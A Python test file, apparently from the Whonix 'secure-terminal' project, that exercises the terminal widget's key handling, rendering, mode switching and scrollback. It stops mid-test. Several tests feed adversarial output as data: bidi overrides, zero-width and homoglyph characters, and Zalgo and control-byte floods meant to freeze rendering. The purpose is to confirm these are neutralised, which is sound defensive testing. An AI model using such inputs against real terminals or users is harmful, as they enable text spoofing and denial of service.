#!/usr/bin/python3 -Bsu

## Copyright (C) 2026 - 2026 ENCRYPTED SUPPORT LLC <adrelanos@whonix.org>
## See the file COPYING for copying conditions.

## AI-Assisted

"""
Offscreen widget/window tests for secure-terminal: the behaviour that lives in
the Qt layer (terminal.py / main.py / dialog.py) rather than the pure core.
Needs PyQt6 (offscreen) and python3-pyte. These are declared dependencies of the
test (the CI container installs them), so a missing one is a hard FAILURE, not a
skip -- a security-relevant test must never be silently disabled. Exit 0 on full
pass, 1 on any failure or missing dependency.
"""

import os
import sys
import signal
import tempfile

os.environ.setdefault('QT_QPA_PLATFORM', 'offscreen')
os.environ['XDG_CONFIG_HOME'] = tempfile.mkdtemp(prefix='st-widget-cfg-')
# Isolate session state too, or a real leftover session on the box would be
# restored and make the window's initial mode/tabs nondeterministic.
os.environ['XDG_STATE_HOME'] = tempfile.mkdtemp(prefix='st-widget-state-')
try:
    signal.signal(signal.SIGCHLD, signal.SIG_IGN)
except (OSError, ValueError, AttributeError):
    pass                    # not the main thread / unsupported: reaping is optional

try:
    from PyQt6.QtWidgets import QApplication, QInputDialog
    from PyQt6.QtGui import QKeyEvent, QColor
    from PyQt6.QtCore import QEvent, Qt, QTimer, QEventLoop, QMimeData
    from secure_terminal.terminal import SecureTerminal, tui_available
except Exception as exc:  # pylint: disable=broad-except
    # Fail closed: a missing test dependency (PyQt6, pyte, the module) must not
    # be silently skipped.
    sys.stderr.write('secure-terminal-tests(widget): FAIL missing dependency: '
                     '%s\n' % exc)
    sys.exit(1)

APP = QApplication.instance() or QApplication([])
PASS = 0
FAIL = 0


def ok(cond, msg):
    global PASS, FAIL
    if cond:
        PASS += 1
    else:
        FAIL += 1
        sys.stderr.write('FAIL: ' + msg + '\n')


def eq(got, want, msg):
    ok(got == want, '%s -> %r, want %r' % (msg, got, want))


def pump(ms):
    loop = QEventLoop()
    QTimer.singleShot(ms, loop.quit)
    loop.exec()


def key(term, qtkey, text='', mods=Qt.KeyboardModifier.NoModifier):
    term.keyPressEvent(QKeyEvent(QEvent.Type.KeyPress, qtkey, mods, text))


def spy_writes(term):
    sent = []
    term._write = sent.append          # pylint: disable=protected-access
    return sent


def feed_output(term, raw):
    """Drive the real _on_readable with `raw` bytes via a pipe, as if the child had
    printed them, so the full output path (pyte feed + _handle_osc + line render)
    runs -- not a shortcut that skips the OSC read handlers."""
    r, w = os.pipe()
    old = term._fd                         # pylint: disable=protected-access
    term._fd = r
    try:
        os.write(w, raw)
        os.close(w)
        w = None
        term._on_readable()                # pylint: disable=protected-access
    finally:
        term._fd = old
        os.close(r)
        if w is not None:
            os.close(w)


# A `-- PROGRAM` launch tab now correctly counts as a running program, so closing
# its window pops the confirm-on-close dialog -- which would block the user-less
# harness. Auto-answer "Yes" (quit anyway) so window closes never hang here;
# test_mainwin owns the explicit confirm-close behaviour tests.
from PyQt6.QtWidgets import QMessageBox as _QMB_close        # noqa: E402
_QMB_close.question = staticmethod(lambda *_a, **_k: _QMB_close.StandardButton.Yes)


# --- line-mode key forwarding -------------------------------------------------
t = SecureTerminal(command='/bin/cat')
sent = spy_writes(t)
key(t, Qt.Key.Key_A, 'a')
key(t, Qt.Key.Key_Return)
key(t, Qt.Key.Key_Backspace)
key(t, Qt.Key.Key_Tab)
eq(sent, [b'a', b'\r', b'\x7f', b'\t'], 'line keys forwarded')
sent.clear()
key(t, Qt.Key.Key_D, '', Qt.KeyboardModifier.ControlModifier)   # Ctrl+D EOF
key(t, Qt.Key.Key_L, '', Qt.KeyboardModifier.ControlModifier)   # Ctrl+L clear
eq(sent, [b'\x04', b'\x0c'], 'ctrl D/L are bytes')
sent.clear()
# Ctrl+<letter> sends its control byte, like a real terminal: cooked mode turns
# 0x03 into SIGINT, a raw-mode app reads the byte itself (readline Ctrl+A/R, an
# app's own "press Ctrl+C again to exit"). Ctrl+backslash -> 0x1c (SIGQUIT).
key(t, Qt.Key.Key_C, '', Qt.KeyboardModifier.ControlModifier)
key(t, Qt.Key.Key_A, '', Qt.KeyboardModifier.ControlModifier)
key(t, Qt.Key.Key_R, '', Qt.KeyboardModifier.ControlModifier)
key(t, Qt.Key.Key_Backslash, '', Qt.KeyboardModifier.ControlModifier)
eq(sent, [b'\x03', b'\x01', b'\x12', b'\x1c'], 'ctrl+key sends its control byte')
# the rest of the Ctrl+@..Ctrl+_ range: forward the control byte Qt computed
# (Ctrl+] -> 0x1d, Ctrl+/ -> 0x1f readline-undo, Ctrl+[ -> 0x1b ESC)
sent.clear()
key(t, Qt.Key.Key_BracketRight, '\x1d', Qt.KeyboardModifier.ControlModifier)
key(t, Qt.Key.Key_Slash, '\x1f', Qt.KeyboardModifier.ControlModifier)
key(t, Qt.Key.Key_BracketLeft, '\x1b', Qt.KeyboardModifier.ControlModifier)
eq(sent, [b'\x1d', b'\x1f', b'\x1b'], 'ctrl+punctuation forwards its control byte')
# a whitespace control (Ctrl+Return carries \r) is NOT swallowed by that
# fallback -- it still submits via the Return path
sent.clear()
key(t, Qt.Key.Key_Return, '\r', Qt.KeyboardModifier.ControlModifier)
eq(sent, [b'\r'], 'ctrl+return still submits the line, not swallowed as a control byte')
# printable non-ASCII is a deliberate keystroke -> sent UTF-8 (euro, e-acute)
sent.clear()
key(t, Qt.Key.Key_unknown, chr(0x20AC))       # euro sign
key(t, Qt.Key.Key_unknown, chr(0x00E9))       # e-acute
eq(sent, [chr(0x20AC).encode('utf-8'), chr(0x00E9).encode('utf-8')],
   'printable unicode input sent as utf-8')
# a non-printable keystroke (bidi override) is still dropped
sent.clear()
key(t, Qt.Key.Key_unknown, chr(0x202E))       # RLO bidi override
eq(sent, [], 'non-printable (bidi) input dropped')

# --- _append: backspace erase, CRLF, overwrite, line-local --------------------
a = SecureTerminal(command='/bin/cat')
a._append('abc')
a._append('\x08 \x08')                 # readline erase
eq(a.toPlainText().rstrip(), 'ab', 'backspace erase')
b = SecureTerminal(command='/bin/cat')
b._append('l1\r\nl2\r\n')
eq(b.toPlainText(), 'l1\nl2\n', 'CRLF collapsed')
c = SecureTerminal(command='/bin/cat')
c._append('123456')
c._append('\rAB')
eq(c.toPlainText(), 'AB3456', 'bare CR overwrite')
d = SecureTerminal(command='/bin/cat')
d._append('first\nsecond')
d._append('\rX')
eq(d.toPlainText(), 'first\nXecond', 'CR line-local')
# multi-backspace: five readline erases delete five chars (persistent cursor)
mb = SecureTerminal(command='/bin/cat')
mb._append('fffff')
for _ in range(5):
    mb._append('\x08 \x08')
eq(mb.toPlainText().rstrip(), '', 'five backspaces erase five chars')

# Real interactive-zsh redraw streams captured under TERM=secure-terminal with
# zsh-autosuggestions + syntax-highlighting. These MUST resolve to the plain text,
# never the append-garble ("llslsls" / "eexport ...") -- the redraws use backspace,
# per-keystroke SGR, AND CSI cursor moves (\x1b[<n>D / \x1b[<n>C), all of which the
# line renderer must honor as overwrites.
zl = SecureTerminal(command='/bin/cat')     # typing "ls" (per-keystroke echo)
zl._append('l\x08l\x1b[90ms\x1b[39m\x08\x08ls\x08\x08\x1b[36ml\x1b[36ms\x1b[39m')
eq(zl.toPlainText().rstrip(), 'ls',
   'zsh per-keystroke redraw of "ls" resolves to "ls", not the append-garble')
zc = SecureTerminal(command='/bin/cat')     # CSI cursor-back overwrite
zc._append('abc\x1b[2DXY')
eq(zc.toPlainText().rstrip(), 'aXY',
   'CSI cursor-back (\\x1b[2D) overwrites in place, not appends')
zr = SecureTerminal(command='/bin/cat')     # burst re-export echo (CSI-back redraw)
zr._append('export TERM=secure-terminal\x1b[27D'
           '\x1b[33me\x1b[33mx\x1b[33mp\x1b[33mo\x1b[33mr\x1b[33mt\x1b[39m\x1b[1C'
           '\x1b[37mT\x1b[37mE\x1b[37mR\x1b[37mM\x1b[37m=\x1b[37ms\x1b[37me\x1b[37mc'
           '\x1b[37mu\x1b[37mr\x1b[37me\x1b[37m-\x1b[37mt\x1b[37me\x1b[37mr\x1b[37mm'
           '\x1b[37mi\x1b[37mn\x1b[37ma\x1b[37ml\x1b[39m')
eq(zr.toPlainText().rstrip(), 'export TERM=secure-terminal',
   'burst re-export echo resolves cleanly, not "eexport ..."')
# BEL is cursor-neutral (rings the bell, writes no cell, moves no column) -- like
# every real terminal. Treating it as a cell shifted the cursor one column off on
# any line-editor redraw that beeps (a completion menu emits BEL), so a following
# backspace+reprint duplicated a character: the garbled tab-completion (#87).
zbel = SecureTerminal(command='/bin/cat')
zbel._append('abc\x07def')
eq(zbel.toPlainText().rstrip(), 'abcdef',
   'a BEL is consumed: no cell and no cursor movement')
zbel2 = SecureTerminal(command='/bin/cat')
zbel2._append('ls a\x07\x08a')          # typed text, completion beep, redraw
eq(zbel2.toPlainText().rstrip(), 'ls a',
   'a BEL before a backspace+reprint does not duplicate a char (#87)')

# The neutralized-byte placeholder is DISPLAYED as a box (U+25A1) for readability,
# but every text export (copy / save / toPlainText) maps it back to ASCII '_', so
# a copied or saved transcript stays pure ASCII. Box mode only.
boxt = SecureTerminal(command='/bin/cat')
boxt._mode = 'box'
feed_output(boxt, 'caf\xc3\xa9\xe2\x80\x8b\n'.encode('utf-8'))   # e-acute + zero-width
ok('\u25a1' in boxt.document().toPlainText(),
   'box display shows the box for a neutralized byte')
ok('\u25a1' not in boxt.toPlainText() and '_' in boxt.toPlainText(),
   'export (toPlainText) maps the box back to ASCII _')
data = boxt.createMimeDataFromSelection
boxt.selectAll()
ok('\u25a1' not in boxt.createMimeDataFromSelection().text(),
   'copy maps the box back to ASCII _')
# Show mode is the opt-in to copy real unicode, so it does NOT collapse to ASCII:
# a printable glyph is copied as itself, while a no-glyph character (shown as a
# box) copies as that box -- never as the raw invisible/bidi byte, which is the
# hazard. So the dangerous character still never reaches the clipboard.
sht = SecureTerminal(command='/bin/cat')
sht._mode = 'show'
# real UTF-8 for e-acute (U+00E9) + a zero-width space (U+200B); build the code
# points then encode, so the bytes are genuine UTF-8, not double-encoded.
feed_output(sht, 'caf\u00e9\u200b\n'.encode('utf-8'))
_sh_export = sht.toPlainText()
ok('\u00e9' in _sh_export, 'show mode copies a real printable glyph as itself (e-acute kept)')
ok('\u25a1' in _sh_export and '\u200b' not in _sh_export,
   'show mode copies a no-glyph char as the box, never the raw zero-width byte')

# --- Zalgo flood: a base char plus thousands of stacked combining marks is one
# grapheme cluster that makes the text engine (Qt in CLI mode, pyte's NFC merge in
# TUI mode) reshape it in O(n^2) -- seconds of GUI freeze per line. cap_combining_runs
# (CLI) and _SafeHistoryScreen.draw (TUI) bound the marks per base to the Unicode
# stream-safe maximum, so a flood renders instantly and a real accent still lands.
import time as _tz                                       # noqa: E402
_ac = '\u0301'                                           # combining acute
# structural: the cap holds in every CLI render mode (100 marks -> at most 32 kept)
for _zm in ('show', 'box', 'reveal'):
    _zt = SecureTerminal(command='/bin/cat'); _zt.apply_mode(_zm)
    feed_output(_zt, ('a' + _ac * 100 + '\n').encode('utf-8'))
    ok(_zt.toPlainText().count(_ac) <= 32,
       'zalgo CLI %s: a 100-mark flood is bounded to <= 32 combining marks' % _zm)
# structural: TUI (pyte) bounds the merged cell too. The trailing CJK char is a
# non-combining non-ASCII code point (>= U+0300), so the run resets and it renders
# in its own cell.
_ztu = SecureTerminal(command='/bin/cat', tui=True)
_cjk = '\u4f60'                                  # a non-combining CJK char
feed_output(_ztu, ('a' + _ac * 100 + _cjk + '\n').encode('utf-8'))
ok(len(_ztu._screen.buffer[0][0].data) <= 34,
   'zalgo TUI: the merged pyte cell is bounded (base + capped marks), not 100')
ok(_ztu._screen.buffer[0][1].data == _cjk,
   'zalgo TUI: a non-combining char after the flood resets the run and lands in its own cell')
# a real accent after a flood still lands (the run resets, not a permanent gag)
_zt2 = SecureTerminal(command='/bin/cat'); _zt2.apply_mode('show')
feed_output(_zt2, ('x' + _ac * 100 + 'y' + _ac + '\n').encode('utf-8'))
ok(('y' + _ac) in _zt2.toPlainText(),
   'zalgo: a base char resets the run so a later real accent is not dropped')
# DoS canary: a large flood (under the pipe buffer) renders fast in both modes;
# unbounded it would take tens of seconds, so a wide margin is not flaky
_zc = ('a' + _ac * 4000 + '\n').encode('utf-8')
_zcli = SecureTerminal(command='/bin/cat'); _zcli.apply_mode('show')
_t0 = _tz.monotonic(); feed_output(_zcli, _zc)
ok(_tz.monotonic() - _t0 < 5.0, 'zalgo CLI: a 4000-mark flood renders well under the DoS threshold')
_ztui = SecureTerminal(command='/bin/cat', tui=True)
_t0 = _tz.monotonic(); feed_output(_ztui, _zc)
ok(_tz.monotonic() - _t0 < 5.0, 'zalgo TUI: a 4000-mark flood renders well under the DoS threshold')
# split-read CLI: a child dripping sub-cap chunks (each read reset to 0) must not
# rebuild the cluster; the trailing run carries across _on_readable calls
_zsr = SecureTerminal(command='/bin/cat'); _zsr.apply_mode('show')
for _ in range(6):
    feed_output(_zsr, (_ac * 20).encode('utf-8'))     # 6 reads x 20 marks = 120
ok(_zsr.toPlainText().count(_ac) <= 32,
   'zalgo CLI: a flood split across PTY reads is still bounded to the cap')
# cursor-move TUI: steer many capped chunks back onto ONE cell via CSI G; the
# per-cell cap must stop it growing unbounded (the stream-run counter could not)
_zcm = SecureTerminal(command='/bin/cat', tui=True)
feed_output(_zcm, b'a')                                # base into cell 0
for _ in range(6):
    feed_output(_zcm, (_ac * 20 + '\x1b[2G').encode('utf-8'))   # marks onto cell 0, cursor back
ok(len(_zcm._screen.buffer[0][0].data) <= 34,
   'zalgo TUI: cursor moves cannot pile combining marks onto one cell past the cap')

# --- "needs TUI" advisory also fires for in-place repaint (zsh ZLE menu) --------
# The bug: an interactive completion menu (zsh/readline) repaints with cursor-up
# and uses no alternate screen, so line mode stripped the redraw into garbage
# WITHOUT advising TUI mode. The advisory must now fire on that repaint too, not
# only on a full-screen (alt-screen) program.
adv = SecureTerminal(command='/bin/cat')
_advices = []
adv.advise_signal.connect(_advices.append)
feed_output(adv, b'plain shell output, no redraw here\n')
ok(_advices == [], 'plain line-mode output raises no TUI advisory')
# a completion-menu-style repaint: print a grid, then cursor-up to repaint in place
feed_output(adv, b'cand1  cand2  cand3\n\x1b[2A\x1b[7mcand1\x1b[27m')
ok(len(_advices) == 1 and 'TUI' in _advices[0],
   'an in-place completion-menu repaint (cursor-up, no alt-screen) advises TUI mode')
# advised at most once per program, so a menu that repaints on every keypress does
# not spam the notice.
feed_output(adv, b'\x1b[2A\x1b[7mcand2\x1b[27m')
ok(len(_advices) == 1, 'the TUI advisory is shown once, not on every repaint')
# a curses app under the RESTRICTED terminfo cannot cursor-address, so it clears
# lines with a BURST of EL instead of moving the cursor (nano) -- still advise (#94).
elb = SecureTerminal(command='/bin/cat')
_elb = []
elb.advise_signal.connect(_elb.append)
elb.has_foreground_program = lambda: True
feed_output(elb, b'\x1b[K' * 5 + b'GNU nano 8.4')
ok(len(_elb) == 1 and 'TUI' in _elb[0],
   '#94: an EL-burst redraw (nano under the restricted entry) advises TUI mode')
# without a foreground program (just the shell) an EL burst does NOT advise
elb2 = SecureTerminal(command='/bin/cat')
_elb2 = []
elb2.advise_signal.connect(_elb2.append)
elb2.has_foreground_program = lambda: False
feed_output(elb2, b'\x1b[K' * 5 + b'text')
ok(_elb2 == [], '#94: an EL burst with no foreground program does not advise')
elb.close(); elb2.close()

# --- a whole-screen clear is a no-op in append-only line mode: note it once ----
clr = SecureTerminal(command='/bin/cat')
_clr_adv = []
clr.advise_signal.connect(_clr_adv.append)
feed_output(clr, b'ordinary output\n')
ok(_clr_adv == [], 'ordinary output raises no clear notice')
feed_output(clr, b'\x1b[H\x1b[2J')          # `clear`: home + erase whole screen
ok(len(_clr_adv) == 1 and 'clear' in _clr_adv[0].lower()
   and 'append-only' in _clr_adv[0],
   'a whole-screen clear is explained (append-only), not silently ignored')
feed_output(clr, b'\x1b[2J')                # a second clear does not re-notify
ok(len(_clr_adv) == 1, 'the clear notice is shown once per tab, not on every clear')
# a full-screen program that clears its screen gets the TUI advisory, not the
# clear notice (its clear is part of drawing, and TUI covers it).
fs = SecureTerminal(command='/bin/cat')
_fs_adv = []
fs.advise_signal.connect(_fs_adv.append)
feed_output(fs, b'\x1b[?1049h\x1b[2Jfull screen app')
ok(len(_fs_adv) == 1 and 'TUI' in _fs_adv[0],
   'a full-screen program that clears raises the TUI advisory, not the clear notice')
# and a LATER clear from that still-active full-screen program (alt screen already
# entered in an earlier chunk, so `entered` is False now) must also stay quiet.
feed_output(fs, b'\x1b[2Jredraw')
ok(len(_fs_adv) == 1,
   'a clear while a full-screen program is already on the alt screen raises no clear notice')

# F6: an alt-screen marker split across an os.read() boundary is still detected -- the
# CLI-mode scan carries a tail between reads (as the sync-2026 scan does).
_asf = SecureTerminal(command='/bin/cat')
ok(not _asf._alt_screen, 'F6: not on the alt screen initially')
feed_output(_asf, b'padding\x1b[?10')            # first half of \x1b[?1049h
ok(not _asf._alt_screen, 'F6: a half marker does not yet flip the alt-screen state')
feed_output(_asf, b'49h\x1b[2Jframe')            # second half -> reunited by the carry
ok(_asf._alt_screen, 'F6: a split alt-screen marker is detected across the read boundary')
_asf.close()
if tui_available():
    # F6 (TUI feed): a split marker is reunited before feeding pyte (so snapshot/restore
    # is not done on HALF a marker), while a COMPLETE read is fed whole (not delayed).
    _ast = SecureTerminal(command='/bin/cat', tui=True)
    feed_output(_ast, b'frame\x1b[?10')          # ends mid-marker -> partial tail HELD
    feed_output(_ast, b'49h\x1b[2Jnext')          # reunites + feeds the whole marker
    ok(True, 'F6: the TUI feed reunites a split alt-screen marker without crashing')
    _ast.close()

# --- full-screen program drive (E2E): start a REAL full-screen program in TUI mode,
# confirm it renders a frame in the pyte grid, send its quit key, confirm a clean exit.
# Answers "can we drive vim/htop/tmux at all?" -- yes, headlessly, no screenshot needed
# (toPlainText reads the grid). A program not installed here is skipped; ssh needs a
# remote target so it stays a manual capture.
if tui_available():
    import shutil as _e2e_which                          # noqa: E402

    def _drive_fullscreen(cmd, ready, quit_bytes, name, expect_exit=True):
        if not _e2e_which.which(cmd[0]):
            return                                        # not installed here -> skip
        _ft = SecureTerminal(command=cmd, tui=True)
        _frame = ''
        for _ in range(200):
            pump(50)
            _frame = _ft.toPlainText()
            if ready in _frame:
                break
        ok(ready in _frame,
           'E2E: %s renders a frame in TUI mode (saw %r)' % (name, ready))
        _ex = []
        _ft.shell_exited.connect(lambda: _ex.append(1))
        if _ft._fd is not None:
            os.write(_ft._fd, quit_bytes)                 # send the program's quit key
        if expect_exit:
            for _ in range(120):
                pump(50)
                if _ex:
                    break
            ok(bool(_ex), 'E2E: %s exits cleanly on its quit key' % name)
        _ft.close()

    _drive_fullscreen(['vim', '-u', 'NONE', '-N'], '~', b'\x1b:q!\r', 'vim')
    _drive_fullscreen(['htop'], 'CPU', b'q', 'htop')
    _drive_fullscreen(['nano', '/tmp/st-nano-e2e.txt'], 'GNU nano', b'\x18n', 'nano')
    _drive_fullscreen(['tmux', '-f', '/dev/null', 'new-session'], 'bash',
                      b'\x02:kill-server\r', 'tmux', expect_exit=False)

# --- render-only preview: re-render safe, and no formatting leak between shows -
pv = SecureTerminal(preview=True)
pv.render_preview('hello\u00e9', mode='detail', markings=True)
ok(pv.toPlainText(), 'a preview renders content')
eq(pv._raw, 'hello\u00e9', 'render_preview retains the text as _raw (not blanked)')
pv.apply_mode('box')                        # re-renders from _raw; _raw='' would blank it
ok(pv.toPlainText(), 'a mode change re-renders the preview from _raw instead of blanking it')
# a preview whose text left an unclosed SGR must not bleed into the next preview
pv.render_preview('a\x1b[31mb', mode='show', markings=False)
pv.render_preview('plain', mode='show', markings=False)
eq(pv._sgr, {'fg': None, 'bg': None, 'bold': False},
   'render_preview resets SGR, so a prior preview\'s formatting does not leak')
# Double-clicking a neutralized character opens the inspect popup; its Copy button
# must place the \uXXXX ESCAPE on the clipboard, never the raw glyph -- copying a
# bidi override or homoglyph as-is is the exact hazard this terminal guards against
# (#300/#301). Prove it for a few high-risk codepoints across the whole popup path.
from PyQt6.QtWidgets import QPushButton as _QPushButton   # noqa: E402
from PyQt6.QtCore import QPoint as _QPoint                # noqa: E402
cpop = SecureTerminal(command='/bin/cat')
for _cp in (0x202E,        # RIGHT-TO-LEFT OVERRIDE (bidi)
            0x200B,        # ZERO WIDTH SPACE (invisible)
            0x0430,        # CYRILLIC SMALL A (homoglyph of ASCII 'a')
            0x1F4A9):       # a non-BMP codepoint -> \U escape
    APP.clipboard().clear()
    cpop = SecureTerminal(command='/bin/cat')
    cpop._show_char_popup(_cp, _QPoint(10, 10))
    dlg = cpop._char_popup
    btn = next(b for b in dlg.findChildren(_QPushButton)
               if b.text().startswith('Copy'))
    btn.click()
    got = APP.clipboard().text()
    want = ('\\u%04x' % _cp) if _cp <= 0xFFFF else ('\\U%08x' % _cp)
    eq(got, want, 'popup Copy yields the escape for U+%04X' % _cp)
    ok(chr(_cp) not in got,
       'popup Copy never places the raw glyph U+%04X on the clipboard' % _cp)
    dlg.close()
# the popup is usable: EVERY label (incl. the explanatory note, not just the
# name) is selectable so its text can be marked and copied, and the Copy button
# confirms visibly so it never looks like a no-op.
from PyQt6.QtCore import Qt as _QtIP                      # noqa: E402
from PyQt6.QtWidgets import QLabel as _QLabelIP           # noqa: E402
_ipop = SecureTerminal(command='/bin/cat')
_ipop._show_char_popup(0x0430, _QPoint(10, 10))
_idlg = _ipop._char_popup
_isel = _QtIP.TextInteractionFlag.TextSelectableByMouse
ok(all(_lb.textInteractionFlags() & _isel for _lb in _idlg.findChildren(_QLabelIP)),
   'every popup label (incl. the note) is selectable, so its text can be copied')
_icopy = next(b for b in _idlg.findChildren(_QPushButton)
              if b.text().startswith('Copy'))
_icopy.click()
ok(_icopy.text().startswith('Copied'),
   'the popup Copy button confirms the copy (text becomes "Copied ...")')
_idlg.close()
# a write lands where a program left the cursor mid-line (zsh prompt + fill),
# not at end-of-document -- the wall-of-spaces-before-input bug
pc = SecureTerminal(command='/bin/cat')
pc._append('P% ')            # prompt
pc._append(' ' * 8)           # trailing fill beyond the cursor
pc._append('\r')              # carriage return -> column 0
pc._append('P% ')             # redraw the prompt over the fill
pc._append('x')               # the echo must land right after the prompt
ok(pc.toPlainText().startswith('P% x'), 'write lands at the persistent cursor')
# backspace over a reveal badge deletes the whole character in the WIDGET (#119):
# the badge is 8 display columns but one logical cell.
bb = SecureTerminal(command='/bin/cat')
bb.apply_mode('reveal')
bb._append('echo ' + chr(0x20AC))
ok(bb.toPlainText().endswith('<U+20AC>'), 'widget shows the reveal badge')
bb._append('\b\x1b[K')                 # readline backspace: one cell + erase-EOL
ok(bb.toPlainText().endswith('echo ') and '<U+' not in bb.toPlainText(),
   'backspace removes the whole badge in the widget (#119)')
# a plain click must not strand the blinking caret where you cannot type: input
# always goes to the shell at the output cursor, so mouseReleaseEvent snaps the
# caret back unless a drag made a selection (which is kept, for copy).
from PyQt6.QtGui import QMouseEvent, QTextCursor      # noqa: E402
from PyQt6.QtCore import QPointF                       # noqa: E402
cs = SecureTerminal(command='/bin/cat')
cs._append('prompt> ')
_out = cs._out_cursor.position()
_stray = QTextCursor(cs.document())
_stray.setPosition(2)                                  # as if a click landed here
cs.setTextCursor(_stray)
_release = QMouseEvent(QEvent.Type.MouseButtonRelease, QPointF(1, 1), QPointF(1, 1),
                       Qt.MouseButton.LeftButton, Qt.MouseButton.NoButton,
                       Qt.KeyboardModifier.NoModifier)
cs.mouseReleaseEvent(_release)
eq(cs.textCursor().position(), _out, 'plain click snaps the caret back to output')
# a selection (drag) survives the release, so copy still works
_sel = QTextCursor(cs.document())
_sel.setPosition(0)
_sel.setPosition(4, QTextCursor.MoveMode.KeepAnchor)
cs.setTextCursor(_sel)
cs.mouseReleaseEvent(_release)
ok(cs.textCursor().hasSelection(), 'a drag selection survives the release')
# scrollback navigation in line mode: PageUp scrolls the buffer up, Shift+Home/
# End jump to the ends, plain Home is left for line editing (does not scroll)
sc = SecureTerminal(command='/bin/cat')
sc.resize(600, 200)
sc.show()
for _i in range(200):
    sc._append('line %d\n' % _i)
_bar = sc.verticalScrollBar()
_bottom = _bar.value()
key(sc, Qt.Key.Key_PageUp)
ok(_bar.value() < _bottom, 'PageUp scrolls the scrollback up')
key(sc, Qt.Key.Key_End, mods=Qt.KeyboardModifier.ShiftModifier)
eq(_bar.value(), _bar.maximum(), 'Shift+End jumps to the bottom')
key(sc, Qt.Key.Key_Home, mods=Qt.KeyboardModifier.ShiftModifier)
eq(_bar.value(), _bar.minimum(), 'Shift+Home jumps to the top')
_bar.setValue(50)
key(sc, Qt.Key.Key_Home)
eq(_bar.value(), 50, 'plain Home does not scroll (reserved for editing)')
# flood must not hang: a large control-laden blob (every byte 0x00-0xff, so it
# carries CR/BS/NL) renders in bounded time and bounded document size. This is
# the "cat /dev/random freeze" regression -- the old per-char cursor path took
# minutes; the bulk path is seconds.
import time as _time                                  # noqa: E402
from secure_terminal import sanitize as _S            # noqa: E402
fl = SecureTerminal(command='/bin/cat')
fl.resize(600, 300)
_blob = _S.render_output((bytes(range(256)) * 8000).decode('latin-1'), 'box')
_t0 = _time.time()
for _ in range(2):                                    # ~4MB of control-laden output
    fl._append(_blob)
_elapsed = _time.time() - _t0
ok(_elapsed < 30, 'control-laden flood renders in bounded time (%.1fs)' % _elapsed)
ok(fl.document().blockCount() <= 10000,
   'flood document stays bounded (%d blocks)' % fl.document().blockCount())
# keyboard tab navigation: the widget emits tab_step / tab_move so the window can
# switch or reorder tabs (Ctrl+PageUp/Down and the Shift variants)
nav = SecureTerminal(command='/bin/cat')
_steps, _moves = [], []
nav.tab_step.connect(_steps.append)
nav.tab_move.connect(_moves.append)
key(nav, Qt.Key.Key_PageDown, mods=Qt.KeyboardModifier.ControlModifier)
key(nav, Qt.Key.Key_PageUp,
    mods=Qt.KeyboardModifier.ControlModifier | Qt.KeyboardModifier.ShiftModifier)
eq((_steps, _moves), ([1], [-1]),
   'Ctrl+PageDown steps tab, Ctrl+Shift+PageUp moves tab')
# a display-mode toggle re-renders the WHOLE existing buffer, not only new output
rr = SecureTerminal(command='/bin/cat')
_rr_raw = 'cafe' + chr(0x00E9) + '\n'
rr._raw = _rr_raw
rr._append(_S.render_output(_rr_raw, 'box'))
eq(rr.toPlainText().rstrip(), 'cafe_', 'box shows non-ascii as _')
rr.apply_mode('reveal')
eq(rr.toPlainText().rstrip(), 'cafe<U+00E9>', 'reveal re-renders existing scrollback')
rr.apply_mode('show')
eq(rr.toPlainText().rstrip(), 'cafe' + chr(0x00E9), 'show re-renders existing scrollback')
rr.apply_mode('box')
eq(rr.toPlainText().rstrip(), 'cafe_', 'box re-renders the scrollback back')
# a SAVED transcript is lossless: fed through the real render path (so each box
# carries its source codepoint), Box mode names the byte inline (Detail) with
# line-edits already RESOLVED (a \r overwrite is applied, not concatenated),
# while a copy / plain text still collapses the box to '_'.
_tr = SecureTerminal(command='/bin/cat')
_tr.apply_mode('box')
_tr._feed_line('load 10%\rdone caf\xe9\n')     # \r overwrite, then a homoglyph
eq(_tr.toPlainText().rstrip(), 'done caf_',
   'box display/copy: the \\r overwrite is resolved and the box maps to "_"')
eq(_tr.transcript_text().rstrip(), 'done caf<U+00E9 LATIN SMALL LETTER E WITH ACUTE>',
   'box transcript: line edits resolved AND the codepoint named (lossless), not "_"')
_tr.shutdown()
# a mode toggle after a flood re-renders only the recent tail, not the full
# scrollback: reveal expands each byte to an 8-char <U+XXXX>, so re-rendering 1MB
# of raw would be ~8MB and freeze the UI. Bounded, the document stays small.
rf = SecureTerminal(command='/bin/cat')
rf._raw = (b''.join(bytes([i % 256]) for i in range(1000)) * 1000).decode('latin-1')
rf.apply_mode('reveal')
ok(len(rf.toPlainText()) < 1_200_000,
   'mode toggle re-renders only the bounded tail, not the whole 8MB expansion')
# regression: switching CLI<->TUI at a shell prompt must NOT blank the scrollback.
# TUI only takes over the screen while a full-screen program is on the alt screen;
# with just a shell it stays in line display, so toggling is a visual no-op and
# the history survives. (Fixed a bug where apply_tui() rendered a blank pyte grid
# over the scrollback the moment TUI was enabled.)
sw = SecureTerminal(command='/bin/cat')
_scroll = 'history-line-A\nhistory-line-B\nhistory-line-C\n'
sw._raw = _scroll
sw._append(_S.render_output(_scroll, 'box'))
ok('history-line-A' in sw.toPlainText() and 'history-line-C' in sw.toPlainText(),
   'scrollback present in CLI mode')
sw.apply_tui(True)
ok('history-line-A' in sw.toPlainText(),
   'CLI->TUI at a shell prompt keeps the scrollback (not blanked)')
sw.apply_tui(False)
ok('history-line-A' in sw.toPlainText(), 'TUI->CLI keeps the scrollback')
for _ in range(5):
    sw.apply_tui(True)
    sw.apply_tui(False)
ok('history-line-A' in sw.toPlainText() and 'history-line-C' in sw.toPlainText(),
   'repeated CLI<->TUI toggling preserves the scrollback (solid)')
# and when a full-screen program DOES take the grid then exits, the scrolling
# document is rebuilt from retained output (only runs where pyte is installed).
sw.apply_tui(True)
if sw.current_tui():
    sw._alt_screen = True
    sw._sync_display()                      # a full-screen program takes the grid
    sw._alt_screen = False
    sw._sync_display()                      # it exits -> scrollback rebuilt
    ok('history-line-A' in sw.toPlainText(),
       'scrollback restored after a full-screen program exits')
sw.apply_tui(False)
# CLI->TUI grid fits the viewport: no useless horizontal scrollbar and no clipped
# right edge. The grid is sized to the text AREA (viewport minus the doc margins),
# not the raw viewport, which used to give one column too many and overflow.
gz = SecureTerminal(command='/bin/cat')
gz.resize(820, 400)
gz.show()
pump(40)
ok(gz.horizontalScrollBarPolicy() == Qt.ScrollBarPolicy.ScrollBarAlwaysOff,
   'the terminal never shows a horizontal scrollbar (line mode wraps, grid fits)')
_gcols, _grows = gz._tui_grid_size()
_gcw = gz.fontMetrics().horizontalAdvance('M') or 1
_gmargin = int(gz.document().documentMargin())
_gvbar = gz.verticalScrollBar().width() if gz.verticalScrollBar().isVisible() else 0
